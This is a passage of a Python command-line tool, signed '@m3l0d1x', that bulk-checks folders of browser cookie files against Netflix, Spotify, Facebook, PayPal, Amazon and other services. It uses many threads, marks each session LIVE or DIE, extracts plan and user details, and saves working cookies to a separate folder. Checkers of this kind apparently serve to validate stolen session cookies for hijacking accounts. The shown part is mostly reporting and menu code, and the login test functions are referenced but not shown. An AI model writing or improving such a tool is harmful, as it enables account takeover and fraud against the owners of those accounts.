                        status_icons.append(f"{Colors.YELLOW}[R]{Colors.RESET}{Colors.YELLOW}[UNKNOWN]{Colors.RESET}")
                    
                    if 'instagram' in result['results'] and isinstance(result['results']['instagram'], dict) and 'status' in result['results']['instagram']:
                        instagram_status = get_status_icon(result['results']['instagram']['status'])
                        status_icons.append(f"{Colors.MAGENTA}[I]{Colors.RESET}{instagram_status}")
                        if 'status_code' in result['results']['instagram']:
                            status_codes.append(f"Instagram:{result['results']['instagram']['status_code']}")
                    elif result.get('has_instagram_cookies', False):
                        status_icons.append(f"{Colors.MAGENTA}[I]{Colors.RESET}{Colors.YELLOW}[UNKNOWN]{Colors.RESET}")

                    if 'youtube' in result['results'] and isinstance(result['results']['youtube'], dict) and 'status' in result['results']['youtube']:
                        youtube_status = get_status_icon(result['results']['youtube']['status'])
                        status_icons.append(f"{Colors.RED}[Y]{Colors.RESET}{youtube_status}")
                        if 'status_code' in result['results']['youtube']:
                            status_codes.append(f"YouTube:{result['results']['youtube']['status_code']}")
                    elif result.get('has_youtube_cookies', False):
                        status_icons.append(f"{Colors.RED}[Y]{Colors.RESET}{Colors.YELLOW}[UNKNOWN]{Colors.RESET}")

                    if 'linkedin' in result['results'] and isinstance(result['results']['linkedin'], dict) and 'status' in result['results']['linkedin']:
                        linkedin_status = get_status_icon(result['results']['linkedin']['status'])
                        status_icons.append(f"{Colors.BLUE}[L]{Colors.RESET}{linkedin_status}")
                        if 'status_code' in result['results']['linkedin']:
                            status_codes.append(f"LinkedIn:{result['results']['linkedin']['status_code']}")
                    elif result.get('has_linkedin_cookies', False):
                        status_icons.append(f"{Colors.BLUE}[L]{Colors.RESET}{Colors.YELLOW}[UNKNOWN]{Colors.RESET}")

                    if 'amazon' in result['results'] and isinstance(result['results']['amazon'], dict) and 'status' in result['results']['amazon']:
                        amazon_status = get_status_icon(result['results']['amazon']['status'])
                        status_icons.append(f"{Colors.YELLOW}[A]{Colors.RESET}{amazon_status}")
                        if 'status_code' in result['results']['amazon']:
                            status_codes.append(f"Amazon:{result['results']['amazon']['status_code']}")
                    elif result.get('has_amazon_cookies', False):
                        status_icons.append(f"{Colors.YELLOW}[A]{Colors.RESET}{Colors.YELLOW}[UNKNOWN]{Colors.RESET}")

                    if 'wordpress' in result['results'] and isinstance(result['results']['wordpress'], dict) and 'status' in result['results']['wordpress']:
                        wordpress_status = get_status_icon(result['results']['wordpress']['status'])
                        status_icons.append(f"{Colors.CYAN}[W]{Colors.RESET}{wordpress_status}")
                        if 'status_code' in result['results']['wordpress']:
                            status_codes.append(f"WordPress:{result['results']['wordpress']['status_code']}")
                    elif result.get('has_wordpress_cookies', False):
                        status_icons.append(f"{Colors.CYAN}[W]{Colors.RESET}{Colors.YELLOW}[UNKNOWN]{Colors.RESET}")

                    if 'capcut' in result['results'] and isinstance(result['results']['capcut'], dict) and 'status' in result['results']['capcut']:
                        capcut_status = get_status_icon(result['results']['capcut']['status'])
                        status_icons.append(f"{Colors.RED}[CC]{Colors.RESET}{capcut_status}")
                        if 'status_code' in result['results']['capcut']:
                            status_codes.append(f"CapCut:{result['results']['capcut']['status_code']}")
                    elif result.get('has_capcut_cookies', False):
                        status_icons.append(f"{Colors.RED}[CC]{Colors.RESET}{Colors.YELLOW}[UNKNOWN]{Colors.RESET}")

                    if 'paypal' in result['results'] and isinstance(result['results']['paypal'], dict) and 'status' in result['results']['paypal']:
                        paypal_status = get_status_icon(result['results']['paypal']['status'])
                        status_icons.append(f"{Colors.BLUE}[PP]{Colors.RESET}{paypal_status}")
                        if 'status_code' in result['results']['paypal']:
                            status_codes.append(f"PayPal:{result['results']['paypal']['status_code']}")
                    elif result.get('has_paypal_cookies', False):
                        status_icons.append(f"{Colors.BLUE}[PP]{Colors.RESET}{Colors.YELLOW}[UNKNOWN]{Colors.RESET}")

                    if status_icons:
                        status_info = f" ({', '.join(status_codes)})" if status_codes else ""
                        print(f"{Colors.GREEN}[SUCCESS]{Colors.RESET} [{processed_count}/{total_files}] {folder_name}/{file_name}: {' '.join(status_icons)} ({result['live_count']} LIVE){status_info}", flush=True)
                    else:
                        print(f"{Colors.YELLOW}[WARNING]{Colors.RESET} [{processed_count}/{total_files}] {folder_name}/{file_name}: No valid results", flush=True)

            except Exception as e:
                print(f"{Colors.RED}[ERROR]{Colors.RESET} [{processed_count}/{total_files}] {folder_name}/{file_name}: Error - {str(e)}", flush=True)
                continue
    
    return {
        'all_results': all_results,
        'total_files': total_files,
        'total_live': total_live,
        'total_dead': total_dead,
        'total_unknown': total_unknown,
        'processed_files': len(all_results)
    }

def print_scan_results(results, filename="Unknown"):

    print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}Cookie Scan Results{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"{Colors.YELLOW}File:{Colors.RESET} {filename}")
    print(f"{Colors.YELLOW}Scan time:{Colors.RESET} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{Colors.CYAN}{'-' * 60}{Colors.RESET}")

    if 'error' in results:
        print(f"{Colors.RED}[ERROR]{Colors.RESET} {results['error']}")
        return
    

    if 'netflix' in results:
        result = results['netflix']
        status_icon = get_status_icon(result['status'])
        print(f"\n{Colors.RED}[NETFLIX]{Colors.RESET} {status_icon}")
        print(f"  Cookies: {result.get('cookie_count', 0)}")
        print(f"  Status: {result['message']}")
        if 'plan_info' in result:
            print(f"  Plan: {result['plan_info']}")
        if 'final_url' in result:
            print(f"  URL: {result['final_url']}")


    if 'spotify' in results:
        result = results['spotify']
        status_icon = get_status_icon(result['status'])
        print(f"\n{Colors.GREEN}[SPOTIFY]{Colors.RESET} {status_icon}")
        print(f"  Cookies: {result.get('cookie_count', 0)}")
        print(f"  Status: {result['message']}")
        if 'plan_info' in result:
            print(f"  Plan: {result['plan_info']}")
        if 'final_url' in result:
            print(f"  URL: {result['final_url']}")


    if 'tiktok' in results:
        result = results['tiktok']
        status_icon = get_status_icon(result['status'])
        print(f"\n{Colors.MAGENTA}[TIKTOK]{Colors.RESET} {status_icon}")
        print(f"  Cookies: {result.get('cookie_count', 0)}")
        print(f"  Status: {result['message']}")
        if 'plan_info' in result:
            print(f"  Plan: {result['plan_info']}")
        if 'final_url' in result:
            print(f"  URL: {result['final_url']}")


    if 'facebook' in results:
        result = results['facebook']
        status_icon = get_status_icon(result['status'])
        print(f"\n{Colors.BLUE}[FACEBOOK]{Colors.RESET} {status_icon}")
        print(f"  Cookies: {result.get('cookie_count', 0)}")
        print(f"  Status: {result['message']}")
        if 'plan_info' in result:
            print(f"  Plan: {result['plan_info']}")
        if 'final_url' in result:
            print(f"  URL: {result['final_url']}")


    if 'canva' in results:
        result = results['canva']
        status_icon = get_status_icon(result['status'])
        print(f"\n{Colors.CYAN}[CANVA]{Colors.RESET} {status_icon}")
        print(f"  Cookies: {result.get('cookie_count', 0)}")
        print(f"  Status: {result['message']}")
        if 'plan_info' in result:
            print(f"  Plan: {result['plan_info']}")
        if 'final_url' in result:
            print(f"  URL: {result['final_url']}")
   
    if 'roblox' in results:
        result = results['roblox']
        status_icon = get_status_icon(result['status'])
        print(f"\n{Colors.YELLOW}[ROBLOX]{Colors.RESET} {status_icon}")
        print(f"  Cookies: {result.get('cookie_count', 0)}")
        print(f"  Status: {result['message']}")
        if 'plan_info' in result:
            print(f"  Plan: {result['plan_info']}")
        if 'final_url' in result:
            print(f"  URL: {result['final_url']}")

    if 'instagram' in results:
        result = results['instagram']
        status_icon = get_status_icon(result['status'])
        print(f"\n{Colors.MAGENTA}[INSTAGRAM]{Colors.RESET} {status_icon}")
        print(f"  Cookies: {result.get('cookie_count', 0)}")
        print(f"  Status: {result['message']}")
        if 'plan_info' in result:
            print(f"  Plan: {result['plan_info']}")
        if 'final_url' in result:
            print(f"  URL: {result['final_url']}")

    if 'youtube' in results:
        result = results['youtube']
        status_icon = get_status_icon(result['status'])
        print(f"\n{Colors.RED}[YOUTUBE]{Colors.RESET} {status_icon}")
        print(f"  Cookies: {result.get('cookie_count', 0)}")
        print(f"  Status: {result['message']}")
        if 'final_url' in result:
            print(f"  URL: {result['final_url']}")

    if 'linkedin' in results:
        result = results['linkedin']
        status_icon = get_status_icon(result['status'])
        print(f"\n{Colors.BLUE}[LINKEDIN]{Colors.RESET} {status_icon}")
        print(f"  Cookies: {result.get('cookie_count', 0)}")
        print(f"  Status: {result['message']}")
        if 'final_url' in result:
            print(f"  URL: {result['final_url']}")

    if 'amazon' in results:
        result = results['amazon']
        status_icon = get_status_icon(result['status'])
        print(f"\n{Colors.YELLOW}[AMAZON]{Colors.RESET} {status_icon}")
        print(f"  Cookies: {result.get('cookie_count', 0)}")
        print(f"  Status: {result['message']}")
        if 'final_url' in result:
            print(f"  URL: {result['final_url']}")

    if 'wordpress' in results:
        result = results['wordpress']
        status_icon = get_status_icon(result['status'])
        print(f"\n{Colors.CYAN}[WORDPRESS]{Colors.RESET} {status_icon}")
        print(f"  Cookies: {result.get('cookie_count', 0)}")
        print(f"  Status: {result['message']}")
        if 'final_url' in result:
            print(f"  URL: {result['final_url']}")
        if 'user_data' in result:
            user_data = result['user_data']
            user_info = ', '.join([f"{k}: {v}" for k, v in user_data.items()])
            print(f"  User: {user_info}")

    if 'capcut' in results:
        result = results['capcut']
        status_icon = get_status_icon(result['status'])
        print(f"\n{Colors.RED}[CAPCUT]{Colors.RESET} {status_icon}")
        print(f"  Cookies: {result.get('cookie_count', 0)}")
        print(f"  Status: {result['message']}")
        if 'plan_info' in result:
            print(f"  Info: {result['plan_info']}")
        if 'final_url' in result:
            print(f"  URL: {result['final_url']}")

    if 'paypal' in results:
        result = results['paypal']
        status_icon = get_status_icon(result['status'])
        print(f"\n{Colors.BLUE}[PAYPAL]{Colors.RESET} {status_icon}")
        print(f"  Cookies: {result.get('cookie_count', 0)}")
        print(f"  Status: {result['message']}")
        if 'plan_info' in result:
            print(f"  Info: {result['plan_info']}")
        if 'final_url' in result:
            print(f"  URL: {result['final_url']}")


    live_count = sum(1 for service in ['netflix', 'spotify', 'tiktok', 'facebook', 'canva', 'roblox', 'instagram', 'youtube', 'linkedin', 'amazon', 'wordpress', 'capcut', 'paypal']
                    if service in results and results[service]['status'] == 'success')
    total_services = len([s for s in ['netflix', 'spotify', 'tiktok', 'facebook', 'canva', 'roblox', 'instagram', 'youtube', 'linkedin', 'amazon', 'wordpress', 'capcut', 'paypal'] if s in results])

    print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}Summary:{Colors.RESET} {Colors.GREEN}{live_count}{Colors.RESET}/{total_services} services {Colors.GREEN}[LIVE]{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")


def print_batch_results(batch_results):

    if 'error' in batch_results:
        print(f"{Colors.RED}[ERROR]{Colors.RESET} {batch_results['error']}")
        return

    print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}Batch Scan Results{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")


    folder_results = {}
    for result in batch_results['all_results']:
        folder_name = result['folder_name']
        if folder_name not in folder_results:
            folder_results[folder_name] = []
        folder_results[folder_name].append(result)


    for folder_name, results in folder_results.items():
        print(f"\n{Colors.YELLOW}[FOLDER]{Colors.RESET} {folder_name}:")

        for result in results:
            file_name = result['file_name']
            file_results = result['results']


            live_count = sum(1 for r in file_results.values() if isinstance(r, dict) and r.get('status') == 'success')
            dead_count = sum(1 for r in file_results.values() if isinstance(r, dict) and r.get('status') == 'dead')
            unknown_count = sum(1 for r in file_results.values() if isinstance(r, dict) and r.get('status') not in ['success', 'dead'])

            print(f"  [FILE] {file_name}")
            print(f"    {Colors.GREEN}[LIVE]{Colors.RESET}: {live_count} | {Colors.RED}[DIE]{Colors.RESET}: {dead_count} | {Colors.YELLOW}[UNKNOWN]{Colors.RESET}: {unknown_count}")
            
            
            for service, service_result in file_results.items():
                if isinstance(service_result, dict) and service_result.get('status') == 'success':
                    service_icon = {
                        'netflix': f'{Colors.RED}[NETFLIX]{Colors.RESET}',
                        'spotify': f'{Colors.GREEN}[SPOTIFY]{Colors.RESET}',
                        'tiktok': f'{Colors.MAGENTA}[TIKTOK]{Colors.RESET}',
                        'facebook': f'{Colors.BLUE}[FACEBOOK]{Colors.RESET}',
                        'canva': f'{Colors.CYAN}[CANVA]{Colors.RESET}',
                        'roblox': f'{Colors.YELLOW}[ROBLOX]{Colors.RESET}',
                        'instagram': f'{Colors.MAGENTA}[INSTAGRAM]{Colors.RESET}',
                        'youtube': f'{Colors.RED}[YOUTUBE]{Colors.RESET}',
                        'linkedin': f'{Colors.BLUE}[LINKEDIN]{Colors.RESET}',
                        'amazon': f'{Colors.YELLOW}[AMAZON]{Colors.RESET}',
                        'wordpress': f'{Colors.CYAN}[WORDPRESS]{Colors.RESET}',
                        'capcut': f'{Colors.RED}[CAPCUT]{Colors.RESET}',
                        'paypal': f'{Colors.BLUE}[PAYPAL]{Colors.RESET}'
                    }.get(service, f'{Colors.WHITE}[{service.upper()}]{Colors.RESET}')

                    service_name = service.title()
                    plan_info = service_result.get('plan_info', 'No plan info')
                    print(f"   {service_icon} {Colors.GREEN}[LIVE]{Colors.RESET}: {plan_info}")
    

    print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}Overall:{Colors.RESET}")
    print(f"  Total files: {batch_results['total_files']}")
    print(f"  {Colors.GREEN}[LIVE]{Colors.RESET}: {batch_results['total_live']}")
    print(f"  {Colors.RED}[DIE]{Colors.RESET}: {batch_results['total_dead']}")
    print(f"  {Colors.YELLOW}[UNKNOWN]{Colors.RESET}: {batch_results['total_unknown']}")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")

def select_service():
    services = list(SCAN_TARGETS.keys())

    print(f"\n{Colors.CYAN}Services:{Colors.RESET}")
    for i, service in enumerate(services, 1):
        service_icon = {
            'netflix': f'{Colors.RED}[NETFLIX]{Colors.RESET}',
            'spotify': f'{Colors.GREEN}[SPOTIFY]{Colors.RESET}',
            'tiktok': f'{Colors.MAGENTA}[TIKTOK]{Colors.RESET}',
            'facebook': f'{Colors.BLUE}[FACEBOOK]{Colors.RESET}',
            'canva': f'{Colors.CYAN}[CANVA]{Colors.RESET}',
            'roblox': f'{Colors.YELLOW}[ROBLOX]{Colors.RESET}',
            'instagram': f'{Colors.MAGENTA}[INSTAGRAM]{Colors.RESET}',
            'youtube': f'{Colors.RED}[YOUTUBE]{Colors.RESET}',
            'linkedin': f'{Colors.BLUE}[LINKEDIN]{Colors.RESET}',
            'amazon': f'{Colors.YELLOW}[AMAZON]{Colors.RESET}',
            'wordpress': f'{Colors.CYAN}[WORDPRESS]{Colors.RESET}',
            'capcut': f'{Colors.RED}[CAPCUT]{Colors.RESET}',
            'paypal': f'{Colors.BLUE}[PAYPAL]{Colors.RESET}'
        }.get(service, f'{Colors.WHITE}[{service.upper()}]{Colors.RESET}')

        print(f"  {i}. {service_icon}")
    
    while True:
        try:
            choice = input(f"\n{Colors.CYAN}[SELECT]{Colors.RESET} Select service (1-{len(services)}): ").strip()
            if not choice:
                return None

            service_index = int(choice) - 1
            if 0 <= service_index < len(services):
                selected_service = services[service_index]
                print(f"{Colors.GREEN}[SELECTED]{Colors.RESET} {selected_service.title()}")
                return selected_service
            else:
                print(f"{Colors.RED}[ERROR]{Colors.RESET} Please enter a number between 1 and {len(services)}")
        except ValueError:
            print(f"{Colors.RED}[ERROR]{Colors.RESET} Please enter a valid number")


def select_services():
    services = list(SCAN_TARGETS.keys())

    print(f"\n{Colors.CYAN}Services:{Colors.RESET}")
    for i, service in enumerate(services, 1):
        service_icon = {
            'netflix': f'{Colors.RED}[NETFLIX]{Colors.RESET}',
            'spotify': f'{Colors.GREEN}[SPOTIFY]{Colors.RESET}',
            'tiktok': f'{Colors.MAGENTA}[TIKTOK]{Colors.RESET}',
            'facebook': f'{Colors.BLUE}[FACEBOOK]{Colors.RESET}',
            'canva': f'{Colors.CYAN}[CANVA]{Colors.RESET}',
            'roblox': f'{Colors.YELLOW}[ROBLOX]{Colors.RESET}',
            'instagram': f'{Colors.MAGENTA}[INSTAGRAM]{Colors.RESET}',
            'youtube': f'{Colors.RED}[YOUTUBE]{Colors.RESET}',
            'linkedin': f'{Colors.BLUE}[LINKEDIN]{Colors.RESET}',
            'amazon': f'{Colors.YELLOW}[AMAZON]{Colors.RESET}',
            'wordpress': f'{Colors.CYAN}[WORDPRESS]{Colors.RESET}',
            'capcut': f'{Colors.RED}[CAPCUT]{Colors.RESET}',
            'paypal': f'{Colors.BLUE}[PAYPAL]{Colors.RESET}'
        }.get(service, f'{Colors.WHITE}[{service.upper()}]{Colors.RESET}')

        print(f"  {i}. {service_icon}")

    while True:
        choice = input(f"\n{Colors.CYAN}[SELECT]{Colors.RESET} Select services (comma separated, e.g. 1,3,5): ").strip()
        if not choice:
            return None

        parts = [p.strip() for p in choice.split(',') if p.strip()]
        indices = []
        valid = True
        for part in parts:
            if not part.isdigit():
                valid = False
                break
            idx = int(part) - 1
            if 0 <= idx < len(services):
                if idx not in indices:
                    indices.append(idx)
            else:
                valid = False
                break

        if not valid or not indices:
            print(f"{Colors.RED}[ERROR]{Colors.RESET} Please enter valid numbers between 1 and {len(services)}, separated by commas")
            continue

        selected_services = [services[i] for i in indices]
        print(f"{Colors.GREEN}[SELECTED]{Colors.RESET} " + ", ".join(s.title() for s in selected_services))
        return selected_services

def fast_folder_scan():

    print(f"\n{Colors.CYAN}{Colors.BOLD}[FAST SCAN]{Colors.RESET}")
    print("=" * 40)
    print("Scan folder like normal but only selected services (faster!)")
    print()

    selected_services = select_services()
    if not selected_services:
        print(f"{Colors.RED}[ERROR]{Colors.RESET} No service selected")
        return

    if isinstance(selected_services, list):
        selected_services_list = selected_services
    else:
        selected_services_list = [selected_services]

    folder_path = input(f"{Colors.BLUE}[FOLDER]{Colors.RESET} Enter the main folder path: ").strip().strip('"').strip("'")
    if not folder_path:
        print(f"{Colors.RED}[ERROR]{Colors.RESET} Please enter the folder path!")
        return

    if not os.path.exists(folder_path):
        print(f"{Colors.RED}[ERROR]{Colors.RESET} Folder not found: {folder_path}")
        return

    while True:
        try:
            thread_input = input(f"{Colors.YELLOW}[THREADS]{Colors.RESET} Number threads (1-50, default 10): ").strip()
            if not thread_input:
                max_workers = 10
                break
            max_workers = int(thread_input)
            if 1 <= max_workers <= 50:
                break
            else:
                print(f"{Colors.RED}[ERROR]{Colors.RESET} Thread count must be between 1 and 50")
        except ValueError:
            print(f"{Colors.RED}[ERROR]{Colors.RESET} Please enter a valid number")

    while True:
        save_choice = input(f"{Colors.CYAN}[SAVE]{Colors.RESET} Save LIVE cookies to separate file? (y/n, default y): ").strip().lower()
        if save_choice in ['', 'y', 'yes', 'có', 'c']:
            save_live = True
            output_folder = input(f"{Colors.BLUE}[FOLDER]{Colors.RESET} name folder output (default 'LIVE_Cookies'): ").strip()
            if not output_folder:
                output_folder = "LIVE_Cookies"
            break
        elif save_choice in ['n', 'no', 'không', 'k']:
            save_live = False
            output_folder = None
            break
        else:
            print(f"{Colors.RED}[ERROR]{Colors.RESET} Please enter y or n")

    target_names = ", ".join(s.title() for s in selected_services_list)
    print(f"\n{Colors.CYAN}[SCAN]{Colors.RESET} Fast scanning folder: {folder_path}", flush=True)
    print(f"{Colors.YELLOW}[TARGET]{Colors.RESET} Testing: {target_names}", flush=True)
    print(f"{Colors.YELLOW}[THREADS]{Colors.RESET} Using {max_workers} threads", flush=True)
    print(f"{Colors.YELLOW}[WAIT]{Colors.RESET} Please wait.", flush=True)
    
    try:
        cookie_files = []
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                if file.endswith('.txt'):
                    file_path = os.path.join(root, file)
                    cookie_files.append(file_path)
        
        if not cookie_files:
            print(f"{Colors.RED}[ERROR]{Colors.RESET} No .txt files found in folder", flush=True)
            return

        total_files = len(cookie_files)
        print(f"{Colors.BLUE}[FOUND]{Colors.RESET} Found {total_files} cookie files", flush=True)

        results = []
        processed_count = 0

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_path = {
                executor.submit(process_single_cookie_file_fast, file_path, selected_services_list): file_path
                for file_path in cookie_files
            }

            for future in as_completed(future_to_path):
                file_path = future_to_path[future]
                file_name = os.path.basename(file_path)
                processed_count += 1

                try:
                    result = future.result()
                    if result:
                        results.append(result)
                        print(f"{Colors.GREEN}[PROCESSED]{Colors.RESET} {processed_count}/{total_files}: {file_name}", flush=True)
                    else:
                        print(f"{Colors.YELLOW}[SKIP]{Colors.RESET} {processed_count}/{total_files}: {file_name}", flush=True)
                except Exception as e:
                    print(f"{Colors.RED}[ERROR]{Colors.RESET} {processed_count}/{total_files}: {file_name}: {str(e)}", flush=True)

        print_fast_folder_results(results, selected_services_list)

        if save_live and results:
            live_count = 0
            for r in results:
                res = r.get('results', {})
                for service in selected_services_list:
                    if res.get(service, {}).get('status') == 'success':
                        live_count += 1

            if live_count > 0:
                print(f"\n{Colors.CYAN}[SAVE]{Colors.RESET} Saving LIVE {target_names} cookies to {output_folder}.", flush=True)

                batch_results = {
                    'all_results': results,
                    'total_live': live_count
                }

                save_live_cookies(batch_results, output_folder)
                print(f"{Colors.GREEN}[COMPLETE]{Colors.RESET} Save completed!", flush=True)

        print(f"\n{Colors.GREEN}{Colors.BOLD}[COMPLETE]{Colors.RESET} Fast folder scan completed!", flush=True)

    except Exception as e:
        print(f"{Colors.RED}[ERROR]{Colors.RESET} Error during fast folder scan: {str(e)}", flush=True)

def process_single_cookie_file_fast(file_path, selected_services):
    
    try:
        if isinstance(selected_services, str):
            selected_services_list = [selected_services]
        else:
            selected_services_list = list(selected_services)

        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        cookies = parse_cookies_txt(content)
        if not cookies:
            return None

        test_functions = {
            'netflix': test_netflix_login,
            'spotify': test_spotify_login,
            'tiktok': test_tiktok_login,
            'facebook': test_facebook_login,
            'canva': test_canva_login,
            'roblox': test_roblox_login,
            'instagram': test_instagram_login,
            'youtube': test_youtube_login,
            'linkedin': test_linkedin_login,
            'amazon': test_amazon_login,
            'wordpress': test_wordpress_login,
            'capcut': test_capcut_login,
            'paypal': test_paypal_login
        }

        results_per_service = {}

        for service in selected_services_list:
            if service not in SCAN_TARGETS:
                continue

            service_domains = SCAN_TARGETS[service]['domains']
            filtered_cookies = []

            for cookie in cookies:
                cookie_domain = cookie.get('domain', '')
                if any(domain in cookie_domain for domain in service_domains):
                    filtered_cookies.append(cookie)

            if not filtered_cookies:
                continue

            test_function = test_functions.get(service)
            if not test_function:
                continue

            result = test_function(filtered_cookies)
            results_per_service[service] = result

        if not results_per_service:
            return None
        
        folder_name = os.path.basename(os.path.dirname(file_path))
        file_name = os.path.basename(file_path)
        
        return {
            'file_path': file_path,
            'folder_name': folder_name,
            'file_name': file_name,
            'results': results_per_service
        }
        
    except Exception as e:
        return None

def print_fast_folder_results(results, selected_services):
    if isinstance(selected_services, str):
        selected_services_list = [selected_services]
    else:
        selected_services_list = list(selected_services) if selected_services else []

    if not results:
        if selected_services_list:
            target_text = ", ".join(selected_services_list)
        else:
            target_text = "selected"
        print(f"\n{Colors.RED}[ERROR]{Colors.RESET} No {target_text} cookies found in any files")
        return
    
    service_icon_map = {
        'netflix': f'{Colors.RED}[NETFLIX]{Colors.RESET}',
        'spotify': f'{Colors.GREEN}[SPOTIFY]{Colors.RESET}',
        'tiktok': f'{Colors.MAGENTA}[TIKTOK]{Colors.RESET}',
        'facebook': f'{Colors.BLUE}[FACEBOOK]{Colors.RESET}',
        'canva': f'{Colors.CYAN}[CANVA]{Colors.RESET}',
        'roblox': f'{Colors.YELLOW}[ROBLOX]{Colors.RESET}',
        'instagram': f'{Colors.MAGENTA}[INSTAGRAM]{Colors.RESET}',
        'youtube': f'{Colors.RED}[YOUTUBE]{Colors.RESET}',
        'linkedin': f'{Colors.BLUE}[LINKEDIN]{Colors.RESET}',
        'amazon': f'{Colors.YELLOW}[AMAZON]{Colors.RESET}',
        'wordpress': f'{Colors.CYAN}[WORDPRESS]{Colors.RESET}',
        'capcut': f'{Colors.RED}[CAPCUT]{Colors.RESET}',
        'paypal': f'{Colors.BLUE}[PAYPAL]{Colors.RESET}'
    }

    icons_text = ", ".join(service_icon_map.get(s, f'{Colors.WHITE}[{s.upper()}]{Colors.RESET}') for s in selected_services_list)

    print(f"\n{Colors.CYAN}Fast Folder Scan Results ({icons_text}):{Colors.RESET}")
    print("=" * 60)
    
    summary = {}
    for s in selected_services_list:
        summary[s] = {'live': 0, 'dead': 0, 'unknown': 0}
    
    for result in results:
        file_name = os.path.basename(result['file_path'])
        service_results = result.get('results', {})

        for service in selected_services_list:
            service_result = service_results.get(service)
            if not service_result:
                continue

            status = service_result.get('status', 'unknown')
            message = service_result.get('message', 'No message')

            if status == 'success':
                summary[service]['live'] += 1
                status_icon = f'{Colors.GREEN}[LIVE]{Colors.RESET}'
            elif status == 'dead':
                summary[service]['dead'] += 1
                status_icon = f'{Colors.RED}[DIE]{Colors.RESET}'
            else:
                summary[service]['unknown'] += 1
                status_icon = f'{Colors.YELLOW}[UNKNOWN]{Colors.RESET}'

            service_icon = service_icon_map.get(service, f'{Colors.WHITE}[{service.upper()}]{Colors.RESET}')
            print(f"   {service_icon} {status_icon} {file_name}: {message}")
    
    print(f"\n{Colors.CYAN}[SUMMARY]{Colors.RESET}")
    for service in selected_services_list:
        service_icon = service_icon_map.get(service, f'{Colors.WHITE}[{service.upper()}]{Colors.RESET}')
        counts = summary[service]
        print(f"   {service_icon} {service.title()}: {Colors.GREEN}{counts['live']} LIVE{Colors.RESET}, {Colors.RED}{counts['dead']} DEAD{Colors.RESET}, {Colors.YELLOW}{counts['unknown']} UNKNOWN{Colors.RESET}")
    print(f"   {Colors.BLUE}[FILES]{Colors.RESET} Total files: {len(results)}")

def save_results_to_file(results, output_folder, source_path):
    #make by @m3l0d1x
    try:
        total_live = 0
        for service, data in results.items():
            if isinstance(data, dict):
                if 'status' in data and data['status'] == 'success':
                    total_live += 1
                elif 'live' in data:
                    total_live += len(data['live'])

        if total_live > 0:
            batch_results = {
                'all_results': [{
                    'file_path': source_path,
                    'folder_name': os.path.dirname(source_path),
                    'file_name': os.path.basename(source_path),
                    'results': results
                }],
                'total_live': total_live
            }
            
            print(f"\n{Colors.CYAN}[SAVE]{Colors.RESET} Saving LIVE cookies to {output_folder}...")
            save_live_cookies(batch_results, output_folder)
            print(f"{Colors.GREEN}[COMPLETE]{Colors.RESET} Save completed!")
        else:
            print(f"{Colors.YELLOW}[WARNING]{Colors.RESET} No LIVE cookies found to save")

    except Exception as e:
        print(f"{Colors.RED}[ERROR]{Colors.RESET} Error saving results: {str(e)}")

def save_batch_results_to_file(batch_results, output_folder, source_path):
    #make by @m3l0d1x
    try:
        if batch_results.get('total_live', 0) > 0:
            print(f"\n{Colors.CYAN}[SAVE]{Colors.RESET} Saving LIVE cookies to {output_folder}...")
            save_live_cookies(batch_results, output_folder)
            print(f"{Colors.GREEN}[COMPLETE]{Colors.RESET} Save completed!")
        else:
            print(f"{Colors.YELLOW}[WARNING]{Colors.RESET} No LIVE cookies found to save")

    except Exception as e:
        print(f"{Colors.RED}[ERROR]{Colors.RESET} Error saving batch results: {str(e)}")

def parse_arguments():
    #make by @m3l0d1x
    parser = argparse.ArgumentParser(description='Cookie Scanner - Scan cookies from files or folders')
    parser.add_argument('path', nargs='?', help='Path to file or folder to scan')
    parser.add_argument('--result', '-r', help='Output folder for results (optional)')
    parser.add_argument('--user-agent', '-ua', help='Custom User-Agent string')
    parser.add_argument('--threads', '-t', type=int, default=10, help='Number of threads for batch scanning (1-50, default: 10)')
    parser.add_argument('--interactive', '-i', action='store_true', help='Run in interactive mode')
    return parser.parse_args()

def main():
    #make by @m3l0d1x
    global CUSTOM_USER_AGENT

    args = parse_arguments()
    
    if args.path and not args.interactive:
        return run_cli_mode(args)
    

    return run_interactive_mode()

def run_cli_mode(args):
    #make by @m3l0d1x
    global CUSTOM_USER_AGENT
    

    if args.user_agent:
        CUSTOM_USER_AGENT = args.user_agent
        print(f"{Colors.GREEN}[SUCCESS]{Colors.RESET} User-Agent set: {CUSTOM_USER_AGENT[:80]}{'...' if len(CUSTOM_USER_AGENT) > 80 else ''}")

    curl_cffi_status = f" (curl_cffi {Colors.GREEN}[OK]{Colors.RESET})" if HAS_CURL_CFFI else f" (curl_cffi {Colors.RED}[MISSING]{Colors.RESET})"

    print("Cookie Scanner" + curl_cffi_status)
    print("New Update Scan: YouTube, Instagram, Roblox, LinkedIn, Amazon, WordPress, CapCut")
    print("=" * 60)
    print()

    path = args.path.strip().strip('"').strip("'")

    if not os.path.exists(path):
        print(f"{Colors.RED}[ERROR]{Colors.RESET} Path does not exist: {path}")
        return

    if os.path.isfile(path):

        print(f"{Colors.CYAN}[SCAN]{Colors.RESET} Scanning cookies from file: {path}")
        print(f"{Colors.YELLOW}[WAIT]{Colors.RESET} Please wait...")

        results = run_with_spinner(scan_cookies_from_file, path)
        if results:
            print_scan_results(results, path)
            if args.result:
                save_results_to_file(results, args.result, path)
        else:
            print(f"{Colors.RED}[ERROR]{Colors.RESET} Failed to scan cookies")
    elif os.path.isdir(path):
        print(f"{Colors.CYAN}[SCAN]{Colors.RESET} Scanning folder: {path}")
        print(f"{Colors.YELLOW}[THREADS]{Colors.RESET} Using {args.threads} threads")
        print(f"{Colors.YELLOW}[WAIT]{Colors.RESET} Please wait...")

        batch_results = run_with_spinner(scan_batch_folders, path, max_workers=args.threads)

        if batch_results and 'error' not in batch_results:
